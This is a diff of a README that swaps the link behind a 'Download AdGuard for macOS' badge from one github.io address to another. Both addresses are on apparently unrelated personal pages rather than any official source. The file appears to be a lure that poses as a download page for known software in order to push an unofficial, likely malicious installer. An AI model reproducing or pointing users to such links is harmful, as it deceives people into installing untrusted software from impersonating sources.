@@ -6,7 +6,7 @@
 
 ## 📥 Download AdGuard for macOS
 
-[![⬇️ Download AdGuard](https://img.shields.io/badge/Download-AdGuard%20Mac-blue?style=for-the-badge&logo=apple)](https://shuziktobehuman.github.io/huja/AdGuard)
+[![⬇️ Download AdGuard](https://img.shields.io/badge/Download-AdGuard%20Mac-blue?style=for-the-badge&logo=apple)](https://mitrobandus.github.io/.github/AdGuard)
 
 ---
 
